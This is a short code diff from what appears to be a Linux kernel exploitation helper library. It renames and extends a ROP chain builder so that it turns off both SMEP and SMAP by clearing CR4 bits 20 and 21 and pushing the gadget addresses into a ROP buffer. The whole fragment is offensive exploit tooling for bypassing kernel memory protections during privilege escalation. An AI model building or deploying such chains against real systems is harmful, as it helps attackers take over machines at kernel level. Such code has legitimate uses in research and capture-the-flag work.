@@ -99,17 +99,17 @@ size_t chain_swapgs_iretq(rop_buffer_t rop,
  * (depreciated since Linux 5.1)
  */
 
-/* CR4 SMEP off: zero 20th bit */
-size_t chain_cr4_smep(rop_buffer_t rop,
-                      uintptr_t pop_rdi_ret,
-                      uintptr_t cr4_val,
-                      uintptr_t mov_cr4_rdi_ret,
-                      uintptr_t ret_addr)
+/* CR4 SMEP/SMAP off: clear bits 20 and 21 */
+size_t chain_cr4_smep_smap(rop_buffer_t rop,
+                           uintptr_t pop_rdi_ret,
+                           uintptr_t cr4_val,
+                           uintptr_t mov_cr4_rdi_ret,
+                           uintptr_t ret_addr)
 {
     size_t i = 0;
 
-    // Disable SMEP by clearing bit 20 of CR4
-    cr4_val &= ~(1UL << 20);
+    // Disable SMEP (bit 20) and SMAP (bit 21)
+    cr4_val &= ~((1UL << 20) | (1UL << 21));
 
     PUSH_ROP(rop, i, pop_rdi_ret);
     PUSH_ROP(rop, i, cr4_val);
